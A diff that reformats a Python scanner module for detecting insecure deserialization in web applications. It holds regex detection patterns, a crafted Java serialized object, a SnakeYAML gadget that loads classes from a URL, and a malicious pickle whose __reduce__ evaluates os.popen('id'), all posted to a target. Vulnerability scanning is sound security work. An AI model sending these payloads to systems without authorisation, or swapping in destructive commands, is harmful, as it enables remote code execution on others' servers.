@@ -12,28 +12,28 @@ from tools.settings import settings
 logger = get_logger("deserialization_detector")
 
 DESER_PATTERNS = [
-    r'(?i)(java\.io\.Serializable|ObjectInputStream|readObject)',
-    r'(?i)(yaml|snakeyaml|Yaml\.load)',
-    r'(?i)(pickle|cPickle|__reduce__|__getstate__)',
+    r"(?i)(java\.io\.Serializable|ObjectInputStream|readObject)",
+    r"(?i)(yaml|snakeyaml|Yaml\.load)",
+    r"(?i)(pickle|cPickle|__reduce__|__getstate__)",
     r'(?i)(php:\/\/|unserialize|O:\d+:"|s:\d+:")',
-    r'(?i)(XMLDecoder|java\.beans\.XMLDecoder)',
-    r'(?i)(Jackson|@JacksonInject|@JsonTypeInfo)',
-    r'(?i)(FastJson|JSON\.parseObject|@JSONType)',
-    r'(?i)(XStream|com\.thoughtworks\.xstream)',
+    r"(?i)(XMLDecoder|java\.beans\.XMLDecoder)",
+    r"(?i)(Jackson|@JacksonInject|@JsonTypeInfo)",
+    r"(?i)(FastJson|JSON\.parseObject|@JSONType)",
+    r"(?i)(XStream|com\.thoughtworks\.xstream)",
 ]
 
 PHP_ERROR_PATTERNS = [
-    r'PHP Fatal error',
-    r'unserialize\(\)',
-    r'__PHP_Incomplete_Class',
-    r'class name must be a valid object',
+    r"PHP Fatal error",
+    r"unserialize\(\)",
+    r"__PHP_Incomplete_Class",
+    r"class name must be a valid object",
 ]
 
 JAVA_ERROR_PATTERNS = [
-    r'java\.io\.(StreamCorruptedException|InvalidClassException)',
-    r'com\.sun\.org\.apache\.xml',
-    r'javax\.xml\.bind',
-    r'org\.apache\.commons',
+    r"java\.io\.(StreamCorruptedException|InvalidClassException)",
+    r"com\.sun\.org\.apache\.xml",
+    r"javax\.xml\.bind",
+    r"org\.apache\.commons",
 ]
 
 PHP_UNSERIALIZE_PAYLOADS = [
@@ -44,10 +44,10 @@ PHP_UNSERIALIZE_PAYLOADS = [
 
 def _build_java_serialized() -> bytes:
     buf = io.BytesIO()
-    buf.write(b'\xac\xed\x00\x05')
-    buf.write(b'\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e')
-    buf.write(b'\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01')
-    buf.write(b'\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x00\x00\x00\x01')
+    buf.write(b"\xac\xed\x00\x05")
+    buf.write(b"\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e")
+    buf.write(b"\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01")
+    buf.write(b"\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x00\x00\x00\x01")
     return buf.getvalue()
 
 
@@ -55,12 +55,13 @@ JAVA_SERIALIZED_BYTES = _build_java_serialized()
 
 YAML_PAYLOAD = (
     "!!javax.script.ScriptEngineManager "
-    "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://test/\"]]]]"
+    '[!!java.net.URLClassLoader [[!!java.net.URL ["http://test/"]]]]'
 )
 
 
-def _test_post(url: str, param: str, data: str, content_type: str,
-               sess: requests.Session, timeout: float) -> Optional[Dict]:
+def _test_post(
+    url: str, param: str, data: str, content_type: str, sess: requests.Session, timeout: float
+) -> Optional[Dict]:
     """Send deserialization payload via POST body (realistic vector)."""
     try:
         if param:
@@ -79,8 +80,9 @@ def _test_post(url: str, param: str, data: str, content_type: str,
     return None
 
 
-def _test_cookie(url: str, param: str, payload: str,
-                 sess: requests.Session, timeout: float) -> Optional[Dict]:
+def _test_cookie(
+    url: str, param: str, payload: str, sess: requests.Session, timeout: float
+) -> Optional[Dict]:
     """Send deserialization payload via Cookie header (PHP session vector)."""
     try:
         r = sess.get(url, cookies={param: payload}, timeout=timeout)
@@ -94,9 +96,11 @@ def _test_cookie(url: str, param: str, payload: str,
 
 def _test_pickle(url: str, param: str, sess: requests.Session, timeout: float) -> Optional[Dict]:
     """Send malicious pickle via POST body (Python deser vector)."""
+
     class _RCE:
         def __reduce__(self):
             return (eval, ("__import__('os').popen('id').read()",))
+
     try:
         pickled = base64.b64encode(pickle.dumps(_RCE())).decode()
         headers = {"Content-Type": "application/x-python-serialize"}
@@ -112,7 +116,9 @@ def _test_pickle(url: str, param: str, sess: requests.Session, timeout: float) -
     return None
 
 
-def _test_java_bytes(url: str, param: str, sess: requests.Session, timeout: float) -> Optional[Dict]:
+def _test_java_bytes(
+    url: str, param: str, sess: requests.Session, timeout: float
+) -> Optional[Dict]:
     """Send Java serialized bytes via POST body."""
     try:
         headers = {"Content-Type": "application/x-java-serialized-object"}
@@ -131,8 +137,9 @@ def _test_java_bytes(url: str, param: str, sess: requests.Session, timeout: floa
     return None
 
 
-def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+def check(
+    url: str, param: str = None, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -154,8 +161,7 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
     # Phase 2: POST body deserialization testing (realistic attack vector)
     if param and not result["vulnerable"]:
         for payload in PHP_UNSERIALIZE_PAYLOADS:
-            ev = _test_post(url, param, payload,
-                            "application/x-www-form-urlencoded", sess, timeout)
+            ev = _test_post(url, param, payload, "application/x-www-form-urlencoded", sess, timeout)
             if ev:
                 result["vulnerable"] = True
                 result["type"] = "php_unserialize_post"
